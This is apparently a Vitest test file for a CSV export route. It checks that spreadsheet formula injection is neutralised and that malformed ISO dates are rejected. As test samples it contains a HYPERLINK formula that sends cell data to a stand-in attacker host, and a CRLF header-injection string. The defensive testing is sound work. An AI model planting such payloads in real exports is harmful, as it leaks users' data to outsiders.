import { describe, it, expect } from "vitest";
import { csvCell, parseIsoDate } from "./route";

describe("csvCell — formula injection (CWE-1236)", () => {
  it("neutralises a leading = so the spreadsheet treats it as text", () => {
    expect(csvCell("=1+1")).toBe("'=1+1");
  });
  it("neutralises the HYPERLINK exfiltration payload an agent can set as their name", () => {
    const payload = '=HYPERLINK("https://attacker.example/?d="&A1,"Revenue")';
    const cell = csvCell(payload);
    // the payload contains commas and quotes, so the cell is CSV-quoted and
    // the neutralising apostrophe sits inside the quotes, where the
    // spreadsheet sees it after unquoting
    expect(cell.replace(/^"/, "").startsWith("'")).toBe(true);
    expect(cell).toBe(`"'=HYPERLINK(""https://attacker.example/?d=""&A1,""Revenue"")"`);
  });
  it("neutralises every dangerous leading character", () => {
    for (const c of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(csvCell(`${c}cmd`).replace(/^"/, "").startsWith("'")).toBe(true);
    }
  });
  it("leaves a dangerous character alone when it is not leading", () => {
    expect(csvCell("Asha=Ali")).toBe("Asha=Ali");
  });

  it("still quotes commas, quotes and newlines correctly", () => {
    expect(csvCell("Ali, Asha")).toBe('"Ali, Asha"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
  });
  it("passes through plain values and numbers unchanged", () => {
    expect(csvCell("Asha Ali")).toBe("Asha Ali");
    expect(csvCell(1234.5)).toBe("1234.5");
    expect(csvCell(0)).toBe("0");
  });
  it("renders null and undefined as empty", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });
  it("a negative number is escaped, which is correct but worth knowing", () => {
    // spreadsheets evaluate a leading '-' as a formula, so this is intended
    expect(csvCell(-50)).toBe("'-50");
  });
});

describe("parseIsoDate", () => {
  it("accepts a valid ISO date", () => {
    expect(parseIsoDate("2026-01-31")).toBe("2026-01-31");
  });
  it("accepts a leap day that exists", () => {
    expect(parseIsoDate("2024-02-29")).toBe("2024-02-29");
  });
  it("rejects a calendar date that does not exist", () => {
    expect(parseIsoDate("2026-02-31")).toBeNull();
    expect(parseIsoDate("2026-13-01")).toBeNull();
    expect(parseIsoDate("2025-02-29")).toBeNull();
  });
  it("rejects anything that is not YYYY-MM-DD", () => {
    expect(parseIsoDate("31/01/2026")).toBeNull();
    expect(parseIsoDate("2026-1-1")).toBeNull();
    expect(parseIsoDate("today")).toBeNull();
    expect(parseIsoDate("")).toBeNull();
    expect(parseIsoDate(null)).toBeNull();
  });
  it("rejects a formula payload aimed at the CSV body and the filename", () => {
    expect(parseIsoDate('=HYPERLINK("x")')).toBeNull();
    expect(parseIsoDate('2026-01-01"')).toBeNull();
    expect(parseIsoDate("2026-01-01\r\nX-Injected: 1")).toBeNull();
  });
});
